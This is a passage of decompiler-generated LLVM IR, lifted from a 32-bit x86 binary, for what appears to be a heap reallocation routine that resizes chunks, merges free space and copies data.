  store i32 %v1_80533f2, i32* @ebx, align 4
  br label %dec_label_pc_80536f7

dec_label_pc_80533fe:                             ; preds = %dec_label_pc_80533dc
  %v1_80533fe = icmp eq i32 %tmp7, 0
  %v1_8053400 = icmp eq i1 %v1_80533fe, false
  br i1 %v1_8053400, label %dec_label_pc_8053413, label %dec_label_pc_8053402

dec_label_pc_8053402:                             ; preds = %dec_label_pc_80533fe
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053409 = call i32 @function_8053939(i32 %tmp6)
  store i32 %v1_8053409, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f7

dec_label_pc_8053413:                             ; preds = %dec_label_pc_80533fe
  %v2_805341e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805341e, i32* @eax, align 4
  store i32 %v2_805341e, i32* %stack_var_-60, align 4
  %v2_8053423 = call i32 @function_80540a0(i32 %v2_805341e, i32 134561949)
  store i32 %v2_8053423, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056800.206 to i32), i32* %stack_var_-60, align 4
  %v1_805342f = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056800.206 to i32))
  store i32 %v1_805342f, i32* %eax.global-to-local, align 4
  %v0_8053437 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8053437, -32
  br i1 %tmp19, label %dec_label_pc_805344e, label %dec_label_pc_805343c

dec_label_pc_805343c:                             ; preds = %dec_label_pc_8053413
  %v0_805343c = load i32, i32* %stack_var_-60, align 4
  %v1_805343c = call i32 @function_8052719(i32 %v0_805343c)
  store i32 %v1_805343c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053443 = inttoptr i32 %v1_805343c to i32*
  store i32 12, i32* %v1_8053443, align 4
  br label %dec_label_pc_80536fa

dec_label_pc_805344e:                             ; preds = %dec_label_pc_8053413
  %v1_805344e = add i32 %v0_8053437, 11
  %tmp20 = icmp ult i32 %v1_805344e, 16
  br i1 %tmp20, label %dec_label_pc_8053465, label %dec_label_pc_805345e

dec_label_pc_805345e:                             ; preds = %dec_label_pc_805344e
  %v1_805345e = and i32 %v1_805344e, -8
  br label %dec_label_pc_8053465

dec_label_pc_8053465:                             ; preds = %dec_label_pc_805344e, %dec_label_pc_805345e
  %stack_var_-40.0 = phi i32 [ %v1_805345e, %dec_label_pc_805345e ], [ 16, %dec_label_pc_805344e ]
  %storemerge26 = phi i32 [ %v1_805345e, %dec_label_pc_805345e ], [ %v1_805344e, %dec_label_pc_805344e ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8053469 = add i32 %tmp6, -8
  store i32 %v1_8053469, i32* @edi, align 4
  %v1_805346c = add i32 %tmp6, -4
  %v2_805346c = inttoptr i32 %v1_805346c to i32*
  %v3_805346c = load i32, i32* %v2_805346c, align 4
  store i32 %v3_805346c, i32* @edx, align 4
  %v1_8053471 = and i32 %v3_805346c, -4
  store i32 %v1_8053471, i32* %eax.global-to-local, align 4
  %v2_8053478 = and i32 %v3_805346c, 2
  %v3_8053478 = icmp eq i32 %v2_8053478, 0
  %v1_805347b = icmp eq i1 %v3_8053478, false
  br i1 %v1_805347b, label %dec_label_pc_8053615, label %dec_label_pc_8053481

dec_label_pc_8053481:                             ; preds = %dec_label_pc_8053465
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053471, i32* @ebx, align 4
  %v7_8053487 = icmp ult i32 %v1_8053471, %stack_var_-40.0
  %v1_8053489 = icmp eq i1 %v7_8053487, false
  br i1 %v1_8053489, label %dec_label_pc_80535c0, label %dec_label_pc_805348f

dec_label_pc_805348f:                             ; preds = %dec_label_pc_8053481
  %v2_805348f = add i32 %v1_8053471, %v1_8053469
  store i32 %v2_805348f, i32* @esi, align 4
  %v1_8053492 = load i32, i32* @global_var_8056bcc.208, align 4
  %v12_8053492 = icmp eq i32 %v2_805348f, %v1_8053492
  %v1_8053498 = icmp eq i1 %v12_8053492, false
  %v1_80534d2 = add i32 %v2_805348f, 4
  %v2_80534d2 = inttoptr i32 %v1_80534d2 to i32*
  %v3_80534d2 = load i32, i32* %v2_80534d2, align 4
  br i1 %v1_8053498, label %dec_label_pc_80534d2, label %dec_label_pc_805349a

dec_label_pc_805349a:                             ; preds = %dec_label_pc_805348f
  %v1_805349f = and i32 %v3_80534d2, -4
  %v2_80534a2 = add i32 %v1_805349f, %v1_8053471
  store i32 %v2_80534a2, i32* %ecx.global-to-local, align 4
  %v1_80534a8 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80534a8, i32* %eax.global-to-local, align 4
  %v7_80534ab = icmp ult i32 %v2_80534a2, %v1_80534a8
  br i1 %v7_80534ab, label %dec_label_pc_8053510, label %dec_label_pc_80534af

dec_label_pc_80534af:                             ; preds = %dec_label_pc_805349a
  %v1_80534af = urem i32 %v3_805346c, 2
  %v5_80534b2 = or i32 %v1_80534af, %stack_var_-40.0
  store i32 %v5_80534b2, i32* @edx, align 4
  store i32 %v5_80534b2, i32* %v2_805346c, align 4
  %v0_80534bd = load i32, i32* %ecx.global-to-local, align 4
  %v2_80534bd = sub i32 %v0_80534bd, %stack_var_-40.0
  %v0_80534bf = load i32, i32* @edi, align 4
  %v2_80534bf = add i32 %v0_80534bf, %stack_var_-40.0
  store i32 %v2_80534bf, i32* %eax.global-to-local, align 4
  %v1_80534c2 = or i32 %v2_80534bd, 1
  store i32 %v1_80534c2, i32* %ecx.global-to-local, align 4
  store i32 %v2_80534bf, i32* @global_var_8056bcc.208, align 4
  %v2_80534ca = add i32 %v2_80534bf, 4
  %v3_80534ca = inttoptr i32 %v2_80534ca to i32*
  store i32 %v1_80534c2, i32* %v3_80534ca, align 4
  br label %dec_label_pc_80536e5

dec_label_pc_80534d2:                             ; preds = %dec_label_pc_805348f
  %v1_80534d7 = and i32 %v3_80534d2, -2
  store i32 %v1_80534d7, i32* %eax.global-to-local, align 4
  %v3_80534da = add i32 %v1_80534d2, %v1_80534d7
  %v4_80534da = inttoptr i32 %v3_80534da to i8*
  %v5_80534da = load i8, i8* %v4_80534da, align 1
  %v6_80534da = urem i8 %v5_80534da, 2
  %v7_80534da = icmp eq i8 %v6_80534da, 0
  %v1_80534df = icmp eq i1 %v7_80534da, false
  br i1 %v1_80534df, label %dec_label_pc_8053510, label %dec_label_pc_80534e1

dec_label_pc_80534e1:                             ; preds = %dec_label_pc_80534d2
  %v1_80534e1 = and i32 %v3_80534d2, -4
  %v2_80534e8 = add i32 %v1_80534e1, %v1_8053471
  store i32 %v2_80534e8, i32* @ebx, align 4
  %v10_80534ea = icmp ult i32 %v2_80534e8, %stack_var_-40.0
  br i1 %v10_80534ea, label %dec_label_pc_8053510, label %dec_label_pc_80534f0

dec_label_pc_80534f0:                             ; preds = %dec_label_pc_80534e1
  %v1_80534f0 = add i32 %v1_8053471, %tmp6
  %v2_80534f0 = inttoptr i32 %v1_80534f0 to i32*
  %v3_80534f0 = load i32, i32* %v2_80534f0, align 4
  store i32 %v3_80534f0, i32* @edx, align 4
  %v1_80534f3 = add i32 %v2_805348f, 12
  %v2_80534f3 = inttoptr i32 %v1_80534f3 to i32*
  %v3_80534f3 = load i32, i32* %v2_80534f3, align 4
  store i32 %v3_80534f3, i32* %eax.global-to-local, align 4
  %v1_80534f6 = add i32 %v3_80534f0, 12
  %v2_80534f6 = inttoptr i32 %v1_80534f6 to i32*
  %v3_80534f6 = load i32, i32* %v2_80534f6, align 4
  %v15_80534f6 = icmp eq i32 %v3_80534f6, %v2_805348f
  %v1_80534f9 = icmp eq i1 %v15_80534f6, false
  br i1 %v1_80534f9, label %dec_label_pc_8053500, label %dec_label_pc_80534fb

dec_label_pc_80534fb:                             ; preds = %dec_label_pc_80534f0
  %v1_80534fb = add i32 %v3_80534f3, 8
  %v2_80534fb = inttoptr i32 %v1_80534fb to i32*
  %v3_80534fb = load i32, i32* %v2_80534fb, align 4
  %v15_80534fb = icmp eq i32 %v3_80534fb, %v2_805348f
  br i1 %v15_80534fb, label %dec_label_pc_8053505, label %dec_label_pc_8053500

dec_label_pc_8053500:                             ; preds = %dec_label_pc_80534fb, %dec_label_pc_80534f0
  %v0_8053500 = call i32 @function_8053ad5()
  store i32 %v0_8053500, i32* %eax.global-to-local, align 4
  %v1_8053505.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053505

dec_label_pc_8053505:                             ; preds = %dec_label_pc_80534fb, %dec_label_pc_8053500
  %v1_8053505 = phi i32 [ %v3_80534f0, %dec_label_pc_80534fb ], [ %v1_8053505.pre, %dec_label_pc_8053500 ]
  %v0_8053505 = phi i32 [ %v3_80534f3, %dec_label_pc_80534fb ], [ %v0_8053500, %dec_label_pc_8053500 ]
  %v2_8053505 = add i32 %v1_8053505, 12
  %v3_8053505 = inttoptr i32 %v2_8053505 to i32*
  store i32 %v0_8053505, i32* %v3_8053505, align 4
  %v0_8053508 = load i32, i32* @edx, align 4
  %v1_8053508 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053508 = add i32 %v1_8053508, 8
  %v3_8053508 = inttoptr i32 %v2_8053508 to i32*
  store i32 %v0_8053508, i32* %v3_8053508, align 4
  %v0_80535c0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80535c0

dec_label_pc_8053510:                             ; preds = %dec_label_pc_80534e1, %dec_label_pc_80534d2, %dec_label_pc_805349a
  %v1_8053517 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053517, i32* %eax.global-to-local, align 4
  store i32 %v1_8053517, i32* %stack_var_-60, align 4
  %v1_805351b = call i32 @function_8052b74(i32 %v1_8053517)
  store i32 %v1_805351b, i32* %eax.global-to-local, align 4
  store i32 %v1_805351b, i32* @edx, align 4
  %v1_8053525 = icmp eq i32 %v1_805351b, 0
  br i1 %v1_8053525, label %dec_label_pc_80536e1, label %dec_label_pc_805352d

dec_label_pc_805352d:                             ; preds = %dec_label_pc_8053510
  %v1_805352d = add i32 %v1_805351b, -8
  store i32 %v1_805352d, i32* %ebx.global-to-local, align 4
  %v1_8053530 = load i32, i32* @esi, align 4
  %v12_8053530 = icmp eq i32 %v1_805352d, %v1_8053530
  %v1_8053532 = add i32 %v1_805351b, -4
  %v2_8053532 = inttoptr i32 %v1_8053532 to i32*
  %v3_8053532 = load i32, i32* %v2_8053532, align 4
  store i32 %v3_8053532, i32* %eax.global-to-local, align 4
  %v1_8053535 = icmp eq i1 %v12_8053530, false
  br i1 %v1_8053535, label %dec_label_pc_8053543, label %dec_label_pc_8053537

dec_label_pc_8053537:                             ; preds = %dec_label_pc_805352d
  %v1_8053537 = and i32 %v3_8053532, -4
  store i32 %v1_8053537, i32* %eax.global-to-local, align 4
  store i32 %v1_8053471, i32* @edx, align 4
  %v2_805353e = add i32 %v1_8053537, %v1_8053471
  store i32 %v2_805353e, i32* @ebx, align 4
  br label %dec_label_pc_80535c0

dec_label_pc_8053543:                             ; preds = %dec_label_pc_805352d
  %v1_8053547 = add i32 %v1_8053471, -4
  store i32 %v1_8053547, i32* %eax.global-to-local, align 4
  %v2_805354c = udiv i32 %v1_8053547, 4
  store i32 %v2_805354c, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8053547, 37
  br i1 %tmp, label %dec_label_pc_8053565, label %dec_label_pc_8053554

dec_label_pc_8053554:                             ; preds = %dec_label_pc_8053543
  store i32 %v1_805351b, i32* %stack_var_-60, align 4
  %v3_805355b = inttoptr i32 %v1_805351b to i16*
  %v4_805355b = call i32 @function_8054962(i16* %v3_805355b, i32 %tmp6, i32 %v1_8053547)
  store i32 %v4_805355b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535ac

dec_label_pc_8053565:                             ; preds = %dec_label_pc_8053543
  store i32 %tmp6, i32* @esi, align 4
  %v1_805356c = inttoptr i32 %tmp6 to i32*
  %v2_805356c = load i32, i32* %v1_805356c, align 4
  store i32 %v2_805356c, i32* %eax.global-to-local, align 4
  %v2_805356e = inttoptr i32 %v1_805351b to i32*
  store i32 %v2_805356c, i32* %v2_805356e, align 4
  %v0_8053570 = load i32, i32* @esi, align 4
  %v1_8053570 = add i32 %v0_8053570, 4
  %v2_8053570 = inttoptr i32 %v1_8053570 to i32*
  %v3_8053570 = load i32, i32* %v2_8053570, align 4
  store i32 %v3_8053570, i32* %eax.global-to-local, align 4
  %v1_8053573 = load i32, i32* @edx, align 4
  %v2_8053573 = add i32 %v1_8053573, 4
  %v3_8053573 = inttoptr i32 %v2_8053573 to i32*
  store i32 %v3_8053570, i32* %v3_8053573, align 4
  %v0_8053576 = load i32, i32* @esi, align 4
  %v1_8053576 = add i32 %v0_8053576, 8
  %v2_8053576 = inttoptr i32 %v1_8053576 to i32*
  %v3_8053576 = load i32, i32* %v2_8053576, align 4
  store i32 %v3_8053576, i32* %eax.global-to-local, align 4
  %v1_8053579 = load i32, i32* @edx, align 4
  %v2_8053579 = add i32 %v1_8053579, 8
  %v3_8053579 = inttoptr i32 %v2_8053579 to i32*
  store i32 %v3_8053576, i32* %v3_8053579, align 4
  %tmp27 = icmp ult i32 %v1_8053547, 17
  br i1 %tmp27, label %dec_label_pc_80535ac, label %dec_label_pc_805357e

dec_label_pc_805357e:                             ; preds = %dec_label_pc_8053565
  %v0_805357e = load i32, i32* @esi, align 4
  %v1_805357e = add i32 %v0_805357e, 12
  %v2_805357e = inttoptr i32 %v1_805357e to i32*
  %v3_805357e = load i32, i32* %v2_805357e, align 4
  store i32 %v3_805357e, i32* %eax.global-to-local, align 4
  %v0_8053581 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053584 = load i32, i32* @edx, align 4
  %v2_8053584 = add i32 %v1_8053584, 12
  %v3_8053584 = inttoptr i32 %v2_8053584 to i32*
  store i32 %v3_805357e, i32* %v3_8053584, align 4
  %v0_8053587 = load i32, i32* @esi, align 4
  %v1_8053587 = add i32 %v0_8053587, 16
  %v2_8053587 = inttoptr i32 %v1_8053587 to i32*
  %v3_8053587 = load i32, i32* %v2_8053587, align 4
  store i32 %v3_8053587, i32* %eax.global-to-local, align 4
  %v1_805358a = load i32, i32* @edx, align 4
  %v2_805358a = add i32 %v1_805358a, 16
  %v3_805358a = inttoptr i32 %v2_805358a to i32*
  store i32 %v3_8053587, i32* %v3_805358a, align 4
  %tmp21 = icmp ult i32 %v0_8053581, 7
  br i1 %tmp21, label %dec_label_pc_80535ac, label %dec_label_pc_805358f

dec_label_pc_805358f:                             ; preds = %dec_label_pc_805357e
  %v0_805358f = load i32, i32* @esi, align 4
  %v1_805358f = add i32 %v0_805358f, 20
  %v2_805358f = inttoptr i32 %v1_805358f to i32*
  %v3_805358f = load i32, i32* %v2_805358f, align 4
  store i32 %v3_805358f, i32* %eax.global-to-local, align 4
  %v0_8053592 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053595 = load i32, i32* @edx, align 4
  %v2_8053595 = add i32 %v1_8053595, 20
  %v3_8053595 = inttoptr i32 %v2_8053595 to i32*
  store i32 %v3_805358f, i32* %v3_8053595, align 4
  %v0_8053598 = load i32, i32* @esi, align 4
  %v1_8053598 = add i32 %v0_8053598, 24
  %v2_8053598 = inttoptr i32 %v1_8053598 to i32*
  %v3_8053598 = load i32, i32* %v2_8053598, align 4
  store i32 %v3_8053598, i32* %eax.global-to-local, align 4
  %v1_805359b = load i32, i32* @edx, align 4
  %v2_805359b = add i32 %v1_805359b, 24
  %v3_805359b = inttoptr i32 %v2_805359b to i32*
  store i32 %v3_8053598, i32* %v3_805359b, align 4
  %tmp22 = icmp ult i32 %v0_8053592, 9
  br i1 %tmp22, label %dec_label_pc_80535ac, label %dec_label_pc_80535a0

dec_label_pc_80535a0:                             ; preds = %dec_label_pc_805358f
  %v0_80535a0 = load i32, i32* @esi, align 4
  %v1_80535a0 = add i32 %v0_80535a0, 28
  %v2_80535a0 = inttoptr i32 %v1_80535a0 to i32*
  %v3_80535a0 = load i32, i32* %v2_80535a0, align 4
  store i32 %v3_80535a0, i32* %eax.global-to-local, align 4
  %v1_80535a3 = load i32, i32* @edx, align 4
  %v2_80535a3 = add i32 %v1_80535a3, 28
  %v3_80535a3 = inttoptr i32 %v2_80535a3 to i32*
  store i32 %v3_80535a0, i32* %v3_80535a3, align 4
  %v0_80535a6 = load i32, i32* @esi, align 4
  %v1_80535a6 = add i32 %v0_80535a6, 32
  %v2_80535a6 = inttoptr i32 %v1_80535a6 to i32*
  %v3_80535a6 = load i32, i32* %v2_80535a6, align 4
  store i32 %v3_80535a6, i32* %eax.global-to-local, align 4
  %v1_80535a9 = load i32, i32* @edx, align 4
  %v2_80535a9 = add i32 %v1_80535a9, 32
  %v3_80535a9 = inttoptr i32 %v2_80535a9 to i32*
  store i32 %v3_80535a6, i32* %v3_80535a9, align 4
  br label %dec_label_pc_80535ac

dec_label_pc_80535ac:                             ; preds = %dec_label_pc_805358f, %dec_label_pc_805357e, %dec_label_pc_8053565, %dec_label_pc_8053554, %dec_label_pc_80535a0
  %v0_80535af = load i32, i32* %ebx.global-to-local, align 4
  %v1_80535af = add i32 %v0_80535af, 8
  store i32 %v1_80535af, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80535b6 = call i32 @function_8053939(i32 %tmp6)
  br label %dec_label_pc_80536dc

dec_label_pc_80535c0:                             ; preds = %dec_label_pc_8053481, %dec_label_pc_8053537, %dec_label_pc_8053505
  %v1_80535d1 = phi i32 [ %v1_8053471, %dec_label_pc_8053481 ], [ %v2_805353e, %dec_label_pc_8053537 ], [ %v0_80535c0.pre, %dec_label_pc_8053505 ]
  %v5_80535c2 = sub i32 %v1_80535d1, %stack_var_-40.0
  store i32 %v5_80535c2, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_80535c2, 16
  br i1 %tmp23, label %dec_label_pc_80535cb, label %dec_label_pc_80535dd

dec_label_pc_80535cb:                             ; preds = %dec_label_pc_80535c0
  %v0_80535cb = load i32, i32* @edi, align 4
  %v1_80535cb = add i32 %v0_80535cb, 4
  %v2_80535cb = inttoptr i32 %v1_80535cb to i32*
  %v3_80535cb = load i32, i32* %v2_80535cb, align 4
  %v1_80535ce = urem i32 %v3_80535cb, 2
  %v2_80535d1 = or i32 %v1_80535ce, %v1_80535d1
  store i32 %v2_80535d1, i32* %eax.global-to-local, align 4
  store i32 %v2_80535d1, i32* %v2_80535cb, align 4
  %v0_80535d6 = load i32, i32* @edi, align 4
  %v1_80535d6 = load i32, i32* @ebx, align 4
  %v2_80535d6 = add i32 %v0_80535d6, 4
  %v3_80535d6 = add i32 %v2_80535d6, %v1_80535d6
  %v4_80535d6 = inttoptr i32 %v3_80535d6 to i32*
  %v5_80535d6 = load i32, i32* %v4_80535d6, align 4
  %v6_80535d6 = or i32 %v5_80535d6, 1
  store i32 %v6_80535d6, i32* %v4_80535d6, align 4
  br label %dec_label_pc_805360d

dec_label_pc_80535dd:                             ; preds = %dec_label_pc_80535c0
  %v0_80535e1 = load i32, i32* @edi, align 4
  %v2_80535e1 = add i32 %v0_80535e1, %stack_var_-40.0
  store i32 %v2_80535e1, i32* %eax.global-to-local, align 4
  %v1_80535e4 = add i32 %v0_80535e1, 4
  %v2_80535e4 = inttoptr i32 %v1_80535e4 to i32*
  %v3_80535e4 = load i32, i32* %v2_80535e4, align 4
  %v1_80535e7 = urem i32 %v3_80535e4, 2
  %v5_80535ea = or i32 %v1_80535e7, %stack_var_-40.0
  store i32 %v5_80535ea, i32* %v2_80535e4, align 4
  %v0_80535f4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535f6 = or i32 %v0_80535f4, 1
  store i32 %v1_80535f6, i32* @edx, align 4
  %v1_80535f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80535f9 = add i32 %v1_80535f9, 4
  %v3_80535f9 = inttoptr i32 %v2_80535f9 to i32*
  store i32 %v1_80535f6, i32* %v3_80535f9, align 4
  %v0_80535fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80535fc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80535fc = add i32 %v0_80535fc, 4
  %v3_80535fc = add i32 %v2_80535fc, %v1_80535fc
  %v4_80535fc = inttoptr i32 %v3_80535fc to i32*
  %v5_80535fc = load i32, i32* %v4_80535fc, align 4
  %v6_80535fc = or i32 %v5_80535fc, 1
  store i32 %v6_80535fc, i32* %v4_80535fc, align 4
  %v0_8053601 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053601 = add i32 %v0_8053601, 8
  store i32 %v1_8053601, i32* %eax.global-to-local, align 4
  store i32 %v1_8053601, i32* %stack_var_-60, align 4
  %v1_8053605 = call i32 @function_8053939(i32 %v1_8053601)
  store i32 %v1_8053605, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805360d

dec_label_pc_805360d:                             ; preds = %dec_label_pc_80535cb, %dec_label_pc_80535dd
  %v0_805360d = load i32, i32* @edi, align 4
  %v1_805360d = add i32 %v0_805360d, 8
  store i32 %v1_805360d, i32* @ebx, align 4
  br label %dec_label_pc_80536e9

dec_label_pc_8053615:                             ; preds = %dec_label_pc_8053465
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8053619 = load i32, i32* @global_var_8056efc.213, align 4
  %v1_805361e = add i32 %v0_8053619, -1
  store i32 %v1_805361e, i32* %eax.global-to-local, align 4
  %v2_8053623 = inttoptr i32 %v1_8053469 to i32*
  %v3_8053623 = load i32, i32* %v2_8053623, align 4
  store i32 %v3_8053623, i32* @ebp, align 4
  %v1_8053626 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053626, i32* %stack_var_-44, align 4
  %v2_805362c = add i32 %v3_8053623, %v1_805361e
  store i32 %v2_805362c, i32* @edx, align 4
  %v1_805362f = sub i32 0, %v0_8053619
  store i32 %v1_805362f, i32* %eax.global-to-local, align 4
  %v2_8053631 = add i32 %v2_805362c, %v1_8053626
  %v2_8053634 = and i32 %v2_8053631, %v1_805362f
  store i32 %v2_8053634, i32* @esi, align 4
  %v2_8053638 = sub i32 %v2_8053634, %v3_8053623
  store i32 %v2_8053638, i32* @ebx, align 4
  %v15_805363a = icmp eq i32 %v1_8053471, %v2_8053638
  br i1 %v15_805363a, label %dec_label_pc_80536e5, label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %dec_label_pc_8053615
  %v2_805364b = sub i32 %v1_8053469, %v3_8053623
  store i32 %v2_805364b, i32* @edi, align 4
  %v2_805364d = add i32 %v3_8053623, %v1_8053471
  store i32 %v2_805364d, i32* %eax.global-to-local, align 4
  store i32 %v2_805364b, i32* %stack_var_-60, align 4
  %v6_8053651 = inttoptr i32 %v2_805364b to i32*
  %v7_8053651 = call i32 @function_80547c6(i32* %v6_8053651, i32 %v2_805364d, i32 %v2_8053634, i32 1, i32 %v1_8053626, i32 %v1_8053471)
  store i32 %v7_8053651, i32* %eax.global-to-local, align 4
  %v10_8053659 = icmp eq i32 %v7_8053651, -1
  br i1 %v10_8053659, label %dec_label_pc_805369d, label %dec_label_pc_805365e

dec_label_pc_805365e:                             ; preds = %dec_label_pc_8053644
  %v1_805365e = load i32, i32* @ebp, align 4
  %v2_805365e = add i32 %v1_805365e, %v7_8053651
  store i32 %v2_805365e, i32* @edx, align 4
  %v0_8053661 = load i32, i32* @ebx, align 4
  %v1_8053661 = or i32 %v0_8053661, 2
  store i32 %v1_8053661, i32* %ebx.global-to-local, align 4
  %v0_8053664 = load i32, i32* @esi, align 4
  store i32 %v0_8053664, i32* %eax.global-to-local, align 4
  %v2_8053666 = add i32 %v2_805365e, 4
  %v3_8053666 = inttoptr i32 %v2_8053666 to i32*
  store i32 %v1_8053661, i32* %v3_8053666, align 4
  %v0_8053669 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053669 = sub i32 %v0_8053669, %v1_8053471
  %v1_805366d = load i32, i32* @global_var_8056f04.218, align 4
  %v2_805366d = add i32 %v1_805366d, %v5_8053669
  store i32 %v2_805366d, i32* %eax.global-to-local, align 4
  store i32 %v2_805366d, i32* @global_var_8056f04.218, align 4
  %v1_8053678 = load i32, i32* @global_var_8056f10.219, align 16
  %tmp24 = icmp ugt i32 %v2_805366d, %v1_8053678
  br i1 %tmp24, label %dec_label_pc_8053680, label %dec_label_pc_8053685

dec_label_pc_8053680:                             ; preds = %dec_label_pc_805365e
  store i32 %v2_805366d, i32* @global_var_8056f10.219, align 16
  br label %dec_label_pc_8053685

dec_label_pc_8053685:                             ; preds = %dec_label_pc_805365e, %dec_label_pc_8053680
  %v1_8053685 = load i32, i32* @global_var_8056f08.220, align 8
  %v2_8053685 = add i32 %v1_8053685, %v2_805366d
  store i32 %v2_8053685, i32* %eax.global-to-local, align 4
  %v1_805368b = load i32, i32* @global_var_8056f14.221, align 4
  %tmp25 = icmp ugt i32 %v2_8053685, %v1_805368b
  br i1 %tmp25, label %dec_label_pc_8053693, label %dec_label_pc_8053698

dec_label_pc_8053693:                             ; preds = %dec_label_pc_8053685
  store i32 %v2_8053685, i32* @global_var_8056f14.221, align 4
  br label %dec_label_pc_8053698

dec_label_pc_8053698:                             ; preds = %dec_label_pc_8053685, %dec_label_pc_8053693
  %v0_8053698 = load i32, i32* @edx, align 4
  %v1_8053698 = add i32 %v0_8053698, 8
  store i32 %v1_8053698, i32* @ebx, align 4
  br label %dec_label_pc_80536e9

dec_label_pc_805369d:                             ; preds = %dec_label_pc_8053644
  %v2_805369d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805369d, i32* %eax.global-to-local, align 4
  %v10_80536a0 = icmp ult i32 %v1_8053471, %v2_805369d
  %v1_80536a4 = icmp eq i1 %v10_80536a0, false
  br i1 %v1_80536a4, label %dec_label_pc_80536e5, label %dec_label_pc_80536a6

dec_label_pc_80536a6:                             ; preds = %dec_label_pc_805369d
  %v1_80536ad = add i32 %stack_var_-40.0, -7
  store i32 %v1_80536ad, i32* %eax.global-to-local, align 4
  store i32 %v1_80536ad, i32* %stack_var_-60, align 4
  %v1_80536b1 = call i32 @function_8052b74(i32 %v1_80536ad)
  store i32 %v1_80536b1, i32* %eax.global-to-local, align 4
  store i32 %v1_80536b1, i32* @ebx, align 4
  %v1_80536bb = icmp eq i32 %v1_80536b1, 0
  br i1 %v1_80536bb, label %dec_label_pc_80536e1, label %dec_label_pc_80536bf

dec_label_pc_80536bf:                             ; preds = %dec_label_pc_80536a6
  %v1_80536c4 = add i32 %v1_8053471, -8
  store i32 %v1_80536c4, i32* %eax.global-to-local, align 4
  store i32 %v1_80536b1, i32* %stack_var_-60, align 4
  %v3_80536cd = inttoptr i32 %v1_80536b1 to i16*
  %v4_80536cd = call i32 @function_8054962(i16* %v3_80536cd, i32 %tmp6, i32 %v1_80536c4)
  store i32 %v4_80536cd, i32* %eax.global-to-local, align 4
  store i32 %v1_80536b1, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80536d7 = call i32 @function_8053939(i32 %tmp6)
  br label %dec_label_pc_80536dc

dec_label_pc_80536dc:                             ; preds = %dec_label_pc_80535ac, %dec_label_pc_80536bf
  %storemerge = phi i32 [ %v1_80536d7, %dec_label_pc_80536bf ], [ %v1_80535b6, %dec_label_pc_80535ac ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536e9

dec_label_pc_80536e1:                             ; preds = %dec_label_pc_80536a6, %dec_label_pc_8053510
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80536e9

dec_label_pc_80536e5:                             ; preds = %dec_label_pc_805369d, %dec_label_pc_8053615, %dec_label_pc_80534af
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_80536e9

dec_label_pc_80536e9:                             ; preds = %dec_label_pc_80536e1, %dec_label_pc_80536dc, %dec_label_pc_8053698, %dec_label_pc_805360d, %dec_label_pc_80536e5
  store i32 %v2_805341e, i32* @eax, align 4
  store i32 %v2_805341e, i32* %stack_var_-60, align 4
  %v2_80536f2 = call i32 @function_80540a0(i32 %v2_805341e, i32 1)
  store i32 %v2_80536f2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f7

dec_label_pc_80536f7:                             ; preds = %dec_label_pc_8053402, %dec_label_pc_80533ee, %dec_label_pc_80536e9
  br label %dec_label_pc_80536fa

dec_label_pc_80536fa:                             ; preds = %dec_label_pc_805343c, %dec_label_pc_80536f7
  %v0_80536fd = load i32, i32* @ebx, align 4
  store i32 %v0_80536fd, i32* %eax.global-to-local, align 4
  store i32 %v0_80533df, i32* @ebx, align 4
  store i32 %v0_80533de, i32* @esi, align 4
  store i32 %v0_80533dd, i32* @edi, align 4
  store i32 %v0_80533dc, i32* @ebp, align 4
  ret i32 %v0_80536fd

; uselistorder directives
  uselistorder i32 %v1_80536b1, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8053685, { 1, 0, 2 }
  uselistorder i32 %v2_805366d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805364b, { 1, 0, 2 }
  uselistorder i32 %v1_8053626, { 1, 0, 2 }
  uselistorder i32 %v3_8053623, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80535e1, { 1, 0 }
  uselistorder i32 %v1_8053547, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_805351b, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80534bf, { 1, 0, 2 }
  uselistorder i32 %v3_80534d2, { 0, 2, 1 }
  uselistorder i32 %v2_805348f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053471, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053469, { 1, 2, 0, 3 }
